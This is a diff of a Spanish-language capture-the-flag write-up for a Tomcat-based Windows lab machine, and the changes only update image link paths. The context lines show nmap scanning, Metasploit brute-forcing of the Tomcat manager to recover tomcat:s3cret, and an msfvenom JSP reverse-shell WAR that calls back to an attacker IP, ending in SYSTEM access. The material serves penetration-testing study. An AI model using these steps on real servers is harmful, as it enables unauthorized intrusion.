@@ -8,7 +8,7 @@ Realizamos un escaneo básico de nmap para ver los puertos abiertos
 nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.197.30 -oN scanner
 ```
 
-![[ 20250706125044.png]]
+![[ 20250706125044.png]](jerry-images/20250706125044.png)
 
 una vez identificados los puertos abiertos vamos a realizar un escáner con scripts básicos para ver servicios y versiones
 
@@ -16,17 +16,17 @@ una vez identificados los puertos abiertos vamos a realizar un escáner con scri
 nmap -p8080 -sCV 10.129.197.30 -oN targeted
 ```
 
-![[ 20250706125221.png]]
+![[ 20250706125221.png]](jerry-images/20250706125221.png)
 
 # Puerto 8080
 
 entramos en la pagina web para ver que encontramos
 
-![[ 20250706125423.png]]
+![[ 20250706125423.png]](jerry-images/20250706125423.png)
 
 despues de explorarla un poco vemos que en la parte de `manager app` aparece una solicitud de credenciales
 
-![[ 20250706125702.png]]
+![[ 20250706125702.png]](jerry-images/20250706125702.png)
 
 ## metasploit
 
@@ -43,7 +43,7 @@ utilizamos el payload
 use auxiliary/scanner/http/tomcat_mgr_login
 ```
 
-![[ 20250706125927.png]]
+![[ 20250706125927.png]](jerry-images/20250706125927.png)
 
 cambiamos el RHOTS 
 
@@ -63,13 +63,13 @@ y lanzamos el exploit
 run
 ```
 
-![[ 20250706130135.png]]
+![[ 20250706130135.png]](jerry-images/20250706130135.png)
 
 vemos el usuario y contraseña tomcat:s3cret
 
 al ingresarlo en la pagina web accedemos al menú de manager 
 
-![[ 20250706130238.png]]
+![[ 20250706130238.png]](jerry-images/20250706130238.png)
 
 en este manu vemos que podemos subir un archivo .war
 
@@ -83,11 +83,11 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.155 LPORT=1234 -f war >> p
 
 subimos el payload con la shell en la pagina web
 
-![[ 20250706130648.png]]
+![[ 20250706130648.png]](jerry-images/20250706130648.png)
 
 pulsamos deploy 
 
-![[ 20250706130727.png]]
+![[ 20250706130727.png]](jerry-images/20250706130727.png)
 
 y vemos un mensaje que indica que el archivo se subió correctamente 
 
@@ -111,11 +111,11 @@ y en la url ponemos
 
 la pagina web quedara en blanco y por la terminal en escucha vemos lo siguiente
 
-![[ 20250706131056.png]]
+![[ 20250706131056.png]](jerry-images/20250706131056.png)
 
 se ha estabecido conexion con la maquina victima 
 
-![[ 20250706131117.png]]
+![[ 20250706131117.png]](jerry-images/20250706131117.png)
 
 y tenemos usuario system = administrador 
 
@@ -125,7 +125,7 @@ explorando el sistema llegamos al directorio `C:\Users\Administrator\Desktop\fla
 
 utilizamos type para ver el archivo (dato importante como es un sistema windows y el nombre del archivo tiene espacios debemos ponerlo entre comillas "nombre de archivo" para que el sistema lo detecte)
 
-![[ 20250706131329.png]]
+![[ 20250706131329.png]](jerry-images/20250706131329.png)
 
 y tenemos ambas flags
 
